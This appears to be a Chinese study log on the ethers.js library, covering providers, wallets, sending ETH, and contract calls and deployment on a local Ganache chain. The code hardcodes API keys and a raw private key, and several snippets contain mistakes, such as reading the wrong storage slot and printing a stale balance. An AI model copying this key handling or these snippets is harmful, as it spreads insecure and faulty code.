const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;main() 解读代码 1234const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125; 代码的意思： 这是一段使用 JavaScript 编写的代码，使用了 ethers.js 库与以太坊节点进行交互。 这段代码定义了一个异步函数 main()，在函数中： 使用 provider.getBalance() 函数获取 vitalik.eth 地址上的以太币余额，并将结果存储在 balance 变量中。这里的 provider 是一个 ethers.js 库中提供的以太坊节点对象，它用于与以太坊网络进行通信。 使用 ethers.utils.formatEther() 函数将以太币余额从 wei 单位转换为以太币单位，并将结果打印到控制台中。 因为 getBalance() 函数是异步函数，它会从以太坊网络中读取数据，因此需要使用 await 关键字等待它完成读取操作。在等待 getBalance() 函数完成后，balance 变量将包含返回的余额值，可以对其进行处理并打印到控制台中。 ethers.js_day023. Provider 提供器3.1 运行如下代码报错：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 导入ethers包import &#123; ethers &#125; from &quot;ethers&quot;;// playcode免费版不能安装ethers，用这条命令，需要从网络上import包（把上面这行注释掉）// import &#123; ethers &#125; from &quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;;// 利用Alchemy的rpc节点连接以太坊网络// 准备 alchemy API 可以参考https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL04_Alchemy/readme.md const ALCHEMY_MAINNET_URL = &#x27;https://eth-mainnet.g.alchemy.com/v2/oKmOQKbneVkxgHZfibs-iFhIlIAl6HDN&#x27;;const ALCHEMY_GOERLI_URL = &#x27;https://eth-goerli.alchemyapi.io/v2/GlaeWuylnNM3uuOo-SAwJxuwTdqHaY5l&#x27;;// 连接以太坊主网const providerETH = new ethers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.JsonRpcProvider(ALCHEMY_GOERLI_URL)const main = async () =&gt; &#123; // 利用provider读取链上信息 // 1. 查询vitalik在主网和Goerli测试网的ETH余额 console.log(&quot;1. 查询vitalik在主网和Goerli测试网的ETH余额&quot;); const balance = await providerETH.getBalance(`vitalik.eth`); const balanceGoerli = await providerGoerli.getBalance(`vitalik.eth`); // 将余额输出在console（主网） console.log(`ETH Balance of vitalik: $&#123;ethers.formatEther(balance)&#125; ETH`); // 输出Goerli测试网ETH余额 console.log(`Goerli ETH Balance of vitalik: $&#123;ethers.formatEther(balanceGoerli)&#125; ETH`); // 2. 查询provider连接到了哪条链 console.log(&quot;\\n2. 查询provider连接到了哪条链&quot;) const network = await providerETH.getNetwork(); console.log(network.toJSON()); // 3. 查询区块高度 console.log(&quot;\\n3. 查询区块高度&quot;) const blockNumber = await providerETH.getBlockNumber(); console.log(blockNumber); // 4. 查询 vitalik 钱包历史交易次数 console.log(&quot;\\n4. 查询 vitalik 钱包历史交易次数&quot;) const txCount = await providerETH.getTransactionCount(&quot;vitalik.eth&quot;); console.log(txCount); // 5. 查询当前建议的gas设置 console.log(&quot;\\n5. 查询当前建议的gas设置&quot;) const feeData = await providerETH.getFeeData(); console.log(feeData); // 6. 查询区块信息 console.log(&quot;\\n6. 查询区块信息&quot;) const block = await providerETH.getBlock(0); console.log(block); // 7. 给定合约地址查询合约bytecode，例子用的WETH地址 console.log(&quot;\\n7. 给定合约地址查询合约bytecode，例子用的WETH地址&quot;) const code = await providerETH.getCode(&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;); console.log(code);&#125;main() 报错结果如下： 报错原因是说 JsonRpcProvider 不是一个构造器，到官方文档上查看，JsonRpcProvider的用法是： 1234// 连接以太坊主网const providerETH = new ethers.providers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.providers.JsonRpcProvider(ALCHEMY_GOERLI_URL) RPC的连接 3.2 与本地的ganache获取连接 代码： 123456789import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 我设置的端口号为8545const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); ​ 3.3 与 metamask（小狐狸🦊钱包）建立连接 3.3.1 需要到 Alchemy 上获取RPC 的节点 12345678const provider = ethers.getDefaultProvider(&quot;&quot;); // 从Alchemy获取const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); 3.4 利用Provider读取链上数据tips：const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;); 这个的连接速度要比const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);的连接速度更快 3.5 获取指定地址的余额 – provider.getBalance(address) 代码： 12345&gt;provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&gt;&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&gt;&#125;); 解释： 这段代码是使用以太坊 JavaScript 库 Ethers.js 来查询指定以太坊地址的余额，并将其以以太币（ETH）的形式打印到控制台上。 具体来说，这段代码执行了以下步骤： 调用 provider.getBalance(address) 方法，其中 provider 是一个以太坊节点提供商，address 是要查询的以太坊地址。 getBalance() 方法返回一个 Promise，该 Promise 在查询完成后返回以太坊地址的余额。 当 Promise 被解析时，then() 方法中的回调函数会被执行。该回调函数使用 ethers.utils.formatEther() 方法将余额从 wei 转换为以太，并将结果打印到控制台上。 如果 Promise 被拒绝（即查询失败），则 catch() 方法中的回调函数会被执行，该回调函数将错误信息打印到控制台上 3.6 查询provider连接到那条链 – provider.getNetwork() 代码： 1const netWork = await provider.getNetwork(); 查询结果： 3.7 查询当前 gas price — provider.getGasPrice() tips:返回的数据格式为BigNumber，可以用BigNumber类的toNumber()或toString() 方法转换成数字或者字符串 代码： 12&gt;const gas_price = await provider.getGasPrice();&gt;console.log(gas_price.toString()); 运行结果： 3.8 查询区块信息 – provider.getBlock() 代码： 1const block = await provider.getBlock(2); 查询结果： 3.9 查询地址的合约bytecode — provider.getCode(address) 代码： 12const address = &quot;0x44f2A5d2CFf45111E5FdcBE600CfA62Ea0386E7f&quot;; //合约地址const code = await providerETH.getCode(address); 查询结果： 4.读取合约信息4.1 创建Contract变量4.1.1 只读Contract tips：参数分别是合约地址，合约的abi和provider变量（只读） 代码： 1const contract = new ethers.Contract(`address`,`abi`,`provider`) 4.1.2 可读写 Contract tips: 参数分别是合约地址，合约的abi和singer变量。Singer签名者是ethers中另一个类，用于签名交易。 代码： 1const contract = new ethers.Contract(`address`, `abi`, `signer`); 4.2 创建只读 Contract实例tips：创建Contract实例需要填入三个参数，分别是合约地址，合约abi和provider变量。 tips:ehters支持两种abi填法 方法一：直接输出合约的abi。也可以像之前web3中那样使用 fs包读取 .abi文件，我觉得这种可读性更强一些。 1234var fs = require(&quot;fs&quot;);var path = &quot;&quot;;//这里是你本地abi的文件地址var contractABI = JSON.parse(fs.readFileSync(path),toString()); 参考代码： 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; int public value = 5; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125; function getValue() external view returns(int) &#123; return value; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);async function main() &#123; let slot0 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot0 = &gt;&quot; + slot0); let slot1 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot1 = &gt;&quot; + slot1);&#125; // 调用函数main()// 调用合约的只读函数let value = await contract.getValue();console.log(&quot;value =&gt; &quot; + value);let address = &quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;;provider.getBalance(address).then((balance)=&gt;&#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;) 运行结果： 注: 在Solidity中，布尔类型(bool)的默认值是false。在你的智能合约中，存储槽(slot)的位置为0，存储的变量是布尔类型(isComplete)，因此默认值为false。 当你部署合约时，存储槽的初始值会被设置为false。如果在之后合约的执行过程中，调用了callme()函数，isComplete变量的值会被设置为true，存储槽的值也会相应地被更新为true。 在使用ethers查询存储槽的值时，如果存储槽的值为false，查询结果会显示为0x0。如果存储槽的值为true，查询结果会显示为0x1。 因此，如果你在查询智能合约的存储槽时得到的结果是0x0，这意味着存储槽的值为false，即isComplete变量还没有被设置为true。如果你想要获取存储槽的实际值，可以将查询结果转换为布尔类型，如下所示: 123const slot0 = await provider.getStorageAt(contractAddress, 0);const isComplete = ethers.utils.bigNumberify(slot0).toNumber() !== 0;console.log(`isComplete: $&#123;isComplete&#125;`); 这段代码将查询结果转换为BigNumber类型，并将其转换为数字类型。如果数字不为0，isComplete变量的值为true，否则为false。 方法二：由于abi可读性太差，ethers创新的引入了人类可读ABI。开发者可以通过function signature和event signature来写ABI。 参考代码： 123456789101112131415161718192021222324252627import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);let abi = [ &quot;function callme() public&quot;, &quot;function getValue() external view returns(int)&quot;,]let contract1 = new ethers.Contract(con_Address,abi,provider);async function demo1()&#123; // 调用合约的只读函数 let value = await contract1.getValue(); console.log(&quot;demo1&#x27;s value =&gt; &quot; + value);&#125;demo1() 运行结果： 4.3 更多的读取合约信息可到 官方文档 查看5.发送ETH5.1 Signer签名类在ethers中，Signer签名者类是以太坊账户的抽象类，可用于对消息和交易进行签名，并将签名的交易发送到以太坊网络，并更改区块链状态。Signer类是抽象类，不能直接实例化，我们需要使用它的子类：Wallet钱包类。 5.2 Wallet钱包类Wallet类继承了Signe类，并且开发者可以像包含私钥的外部拥有者账户（EOA）一样，用它对交易和消息进行签名。 5.2.1方法一：创建随机的wallet对象我们可以使用 ethers.Wallet.createRandom()函数创建带有随机私钥的Wallet对象。对该私钥由加密安全的熵源生成，如果当前环境没有安全的熵源，则会引发错误。 tips：在密码学中，熵（entropy）是指随机性的度量。在智能合约中，熵源（entropy source）是指用于生成随机数或随机种子的源头。 在智能合约中，为了确保随机数的安全性和不可预测性，需要使用熵源来生成随机数或随机种子。通常情况下，熵源可以是外部的数据源，例如区块哈希或者时间戳等，也可以是合约内部的数据源，例如合约的存储槽或者合约的执行结果等。 需要注意的是，熵源的质量和安全性对于密码学应用非常重要。如果熵源不够随机或者不够安全，可能会导致随机数的可预测性，从而破坏密码学应用的安全性。因此，在使用熵源生成随机数或随机种子时，需要选择合适的熵源，并对其进行充分的测试和验证，以确保其安全性和不可预测性。 12// 创建随机的wallet对象const wallet1 = new ethers.Wallet.createRandom() 5.2.2方法二：用私钥创建wallet对象我们已知私钥的情况下，可以利用ethers.Wallet() 函数创建 Wallet对象。 从Ganache中获取privateKey 123// 利用私钥和provider创建wallet对象const privateKey = &#x27;&#x27; // 填入你的私钥const wallet2 = new ethers.Wallet(privateKey, provider) 5.2.3方法三：从助记词创建wallet对象我们已知助记词的情况下，可以利用 ethers.Wallet.fromMnemonic() 函数创建Wallet对象。 12// 从助记词创建wallet对象const wallet3 = new ethers.Wallet.fromMnemonic(mnemonic.phrase) 5.2.4 其他方法：通过JSON文件创建wallet对象通过ethers.Wallet.fromEncryptedJson解密一个JSON钱包文件创建钱包实例，JSON文件即keystore文件，通常来自Geth, Parity等钱包 5.3 发送ETH我们可以利用Wallet实例来发送ETH。首先，我们需要构造一个交易请求，在里面声明接收地址to和发送的ETH数额value。交易请求TransactionRequest类型可以包含发送方 from，nonce值 nounce，请求数据data等信息。 12345// 创建交易请求，参数：to为接收地址，value为ETH数额const tx = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125; 然后，我们就可以利用Wallet类的sendTransaction来发送交易，等待交易上链，并获得交易的数据。 1234//发送交易，获得收据const receipt = await wallet2.sendTransaction(tx)await receipt.wait() // 等待链上确认交易console.log(receipt) // 打印交易详情 5.4 代码实例5.4.1创建Wallet实例三种方法的示例代码： 1234567891011121314151617181920212223242526272829303132333435363738import &#123; ethers &#125; from &quot;ethers&quot;;const netWork = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.providers.JsonRpcProvider(netWork);// let balance = await provider.getBalance(&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;);// console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);/** 方法一：创建随机私钥的Wallet对象。 这种方法创建的钱包是单机的，我们需要用connect(provider)函数，连接到以太坊节点。这种方法创建的钱包可以用mnemonic获取助记词 */const wallet1 = ethers.Wallet.createRandom();console.log(&quot;wallet1 =&gt;\\n&quot;,wallet1);const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;console.log(&quot;助记词：\\n&quot; , mnemonic);/** * 方法二：利用私钥和provider实例创建Wallet对象 * 这种方法不能获取助记词 */const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);console.log(&quot;wallet2 =&gt;\\n&quot;,wallet2);/** * 方法三：利用助记词创建Wallet对象 */// 从助记词创建wallet对象const wallet3 = ethers.Wallet.fromMnemonic(mnemonic.phrase);console.log(&quot;wallet3 =&gt; &quot;,wallet3); 运行结果： 5.4.2 获取钱包地址 代码： 123456789101112/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() const address3 = await wallet3.getAddress() // 获取地址console.log(`1. 获取钱包地址`);console.log(`钱包1地址: $&#123;address1&#125;`);console.log(`钱包2地址: $&#123;address2&#125;`);console.log(`钱包3地址: $&#123;address3&#125;`);console.log(`钱包1和钱包3的地址是否相同: $&#123;address1 === address3&#125;`); 运行结果： 5.4.3 获取助记词利用钱包对象的mnemonic成员获取助记词： 1console.log(`钱包1助记词: $&#123;wallet1.mnemonic.phrase&#125;`) 结果： 5.4.4 利用钱包对象的 privateKey 成员获取私钥：1console.log(`钱包2私钥: $&#123;wallet2.privateKey&#125;`) 运行结果： 到ganache上查看： 结果是相同的。 5.4.5 获取钱包在链上的交互次数利用 getTransactionCount()函数获取钱包在链上的交互次数 1234const txCount1 = await wallet1WithProvider.getTransactionCount()const txCount2 = await wallet2.getTransactionCount()console.log(`钱包1发送交易次数: $&#123;txCount1&#125;`)console.log(`钱包2发送交易次数: $&#123;txCount2&#125;`) 运行结果： 到ganache上查看： 5.4.6 发送ETH我们用wallet2给wallet1发送0.001 ETH，并打印交易前后的钱包余额。由于wallet1是新建的随机私钥钱包，因此交易前余额为0，而交易后余额为0.001 ETH。 1234567891011121314151617181920212223242526272829303132333435363738const wallet1 = ethers.Wallet.createRandom();const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() /** * 发送ETH */console.log(&quot; wallet2 给 wallet1 转账0.01ETH&quot;);//交易前余额console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`);// 构建交易请求；to为接收地址，value为ETH数额const TX = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125;// 发送交易，获得收据const recepit = await wallet2.sendTransaction(TX);await recepit.wait();console.log(&quot;receipt =&gt; &quot;,recepit);console.log(&quot;发送后的账户余额&quot;);console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`); 运行结果： ethers.js_day036. 合约交互6.1 创建可写Contract变量 声明可写的Contract变量的规则： 1const contract = new ethers.Contract(address, abi, signer) 解读：其中 address 是合约地址，abi是合约的abi接口，singer是wallet对象。声明可写contract需要提供signer，声明可读contract只需要provider 将可读合约转换为可写合约： 1const contract2 = contract.connect(signer) 6.2 合约交互 读合约信息不需要gas。写入合约需要接入合约信息，构建交易，并支付gas。该交易将由整个网络的每个节点以及矿工验证，并改变区块链状态。 合约交互的方法如下： 1234// 发送交易const tx = await contract.METHOD_NAME(args [, overrides])// 等待链上确认交易await tx.wait() 解读代码：其中METHOD_NAME为调用的函数名，args为函数参数，[, overrides]是可以选择传入的数据，包括： gasPrice：gas价格 gasLimit：gas上限 value：调用时传入的ether（单位是wei） nonce：nonce（随机数？） 注：此方法不能获取合约运行的返回值，如若需要获取合约运行你的返回值，要使用Solidity事件记录，然后利用交易收据去查询。 6.3 例子：与本地ganache合约交互 创建provider，wallet变量 123456789&gt;import &#123; ethers &#125; from &quot;ethers&quot;;&gt;// 获取本地的provider&gt;const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);&gt;// 根据私钥创建 wallet对象&gt;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;&gt;const wallet = new ethers.Wallet(privateKey, provider); 创建可写合约变量，在我自己 domo1.sol中调用4个函数 getSlot0():查找插槽0位置的值； getSlot1():查找插槽1位置的值； getSlot2():查找插槽2位置的值； depoist():转账； balanceOf():查询地址余额。 tips：这里我使用的是方法是传入remix上获取的abi 12345678910111213/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0x5B1557A5AD3cfAC88F3624743BF67baB28723899&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet); 3.调用getSlot0、1、2()三个函数，查看其值 12345678910// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`) 运行结果： 4.查询账户的余额 123456// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`) 运行结果： 5.转账操作，打印交易详情和余额。 123456//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 运行结果： 由于vscode显示数位的问题，使用在remix上查询显示的位数更多 注：对于非pure&#x2F;view函数的调用，会返回交易的信息。如果想知道函数执行过程中合约变量的变化，可以在合约中使用emit输出事件，并在返回的transaction信息中读取事件信息来获取对应的值 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0xf8fe22cA93bD2416a106dFB62168C0D7eBF557FE&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet);/** * 调用合约的函数 */// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`)//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 7.部署合约7.1 合约工厂 ethers.js 创造了合约工厂 ContractFactory类型，方便开发者部署合约。你可以利用合约abi，编译得到的字节码bytecode和签名者变量 singer 来创建合约工厂实例，为部署合约做准备。 1const contractFactory = new ethers.ContractFactory(abi, bytecode, signer); 注：如果合约的构造函数有参数，那么在abi中必须包含构造函数。 在创建好合约工厂之后，可以调用它的deploy函数，并传入合约构造函数的参数args来部署并得到合约实例： 1const contract = await contractFactory.deploy(args) 可以使用两种命令，等待合约部署在链上确认，然后再进行交互 12await contractERC20.deployed()//或者 await contract.deployTransaction.wait() 7.2 例子：部署我自己编写的demo1.sol合约 demo2.sol 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract demo2 &#123; uint slot0; address slot1; string public slot2; // 初始化一些变量 constructor(uint _slot0, address _slot1, string memory _slot2) payable&#123; slot0 = _slot0; slot1 = _slot1; slot2 = _slot2; &#125; function setSlot0(uint num) public &#123; slot0 = num; &#125; function getSlot0() external view returns(uint)&#123; return slot0; &#125; function setSlot1(address _address) public &#123; slot1 = _address; &#125; function getSlot1() external view returns(address)&#123; return slot1; &#125; function setSlot2(string memory _str) public &#123; slot2 = _str; &#125; function getSlot2() external view returns(string memory)&#123; return slot2; &#125; function depoist(uint _amount, address payable _to) external &#123; uint balance = address(this).balance; require(balance &gt; _amount, &quot;You balance is less than your address(this).balance&quot;); _to.transfer(_amount); &#125; function balanceOf(address _address) external view returns(uint) &#123; return address(_address).balance; &#125;&#125; 创建provider和wallet变量 123456789import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider); 准备demo1合约的字节码和ABI(这里我使用remix生成的ABI)。因为demo2的构造函数含有参数，因此我们需要把它包含再ABI中。合约的字节码可以从remix的编译面板中点击bytecode按钮拷贝下来(为了代码的可读性，将拷贝的字节码新建一个 .code文件存放，获取的时候 使用 fs来读取)，其中”object”字段对应的数据就是字节码。如果部署在链上的合约，你可以在etherscan的Contract页面的Contract Creation Code中找到。 123456789101112131415161718192021222324252627282930313233343536373839 // demo2人类可读abi /** const demo2ABI = [ &quot;constructor(uint _slot0, address _slot1, string memory _slot2) payable&quot;, ....... ] */ // 读取文件的abi const ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString()); // 读取文件的bytecode const byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString(); 3. 创建合约工厂ContractFactory实例 ```js // 创建合约工厂 ContractFactory 实例 const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet); 4. 调用工厂合约的deploy() 函数并填入构造函数的参数，部署demo2合约并获取合约实例。有写常用方法： - `contract.address`获取合约地址， - `contract.deployTransaction`获取部署详情， - `contractERC20.deployed()`等待合约部署在链上确认。 ```js // 利用 factoryDemo2 部署demo2 合约 const gasPrice = await provider.getGasPrice(); const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;; const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction); console.log(`部署得到的合约地址：$&#123;constract.address&#125;`); console.log(&quot;部署合约的交易详情&quot;); console.log(constract.deployTransaction); 调用合约函数 12345678910111213/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`); let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 执行结果： 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString());// 读取文件的bytecodeconst byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString();// 创建合约工厂 ContractFactory 实例const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet);// 利用 factoryDemo2 部署demo2 合约const gasPrice = await provider.getGasPrice();const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;;const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction);console.log(`部署得到的合约地址：$&#123;constract.address&#125;`);console.log(&quot;部署合约的交易详情&quot;);console.log(constract.deployTransaction);/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 8.检索事件 — 很有用8.1 参考博客：请移步 这里8.2 检索事件 可以利用Ethers中合约类型的queryFilter()函数读取合约释放的事件 1const transferEvents = await contract.queryFilter(&#x27;事件名&#x27;,起始区块，结束区块) queryFilter() 包含3个参数，分别是事件名（必填），起始区块（选填），和结束区块（选填）。检索结果会以数组的形式返回。 注：要检索的事件必须包含在合约的abi中。 9. 监听合约事件9.1 监听合约事件 contract.on 在ethersjs中，合约对象有一个contract.on 的监听方法，让我们持续监听合约的事件： 1contract.on(&quot;eventName&quot;, function) contract.on 有两个参数，一个是要监听的事件名称”eventName”，需要包含合约abi中；另一个是我们在事件发生时调用的函数 contract.once 合约对象有一个contract.once的监听方法，让我们只监听一次合约释放事件，它的参数与contract.on一样： 1contract.once(&quot;eventName&quot;,function) 9.2 监听合约示例在这里 —-&gt; here ………………… 10. 事件过滤现阶段的我还不适合考虑这些，日后再学 博客链接 ………………… 11. BigNumber 和 单位转换11.1 BigNumber 在以太坊中，许多计算都对JavaScript整数的安全值（js中最大安全数为9007199254740991）。因此，ethers.js使用BigNumber 类安全地对任何数量级的数字进行数学运算。在ethers.js中，大多数需要返回值的操作将返回BigNumber，而接受值的参数也会接受他们。 BigNumber官方文档 11.2 创建BigNumber实例 可以利用 ethers.BigNumber.from() 函数将string，number，BigNumber等类型转换为BigNumber。 注：超过js最大安全整数的数值将不能转换 1234567const oneGwei = ethers.BigNumber.from(&quot;1000000000&quot;); // 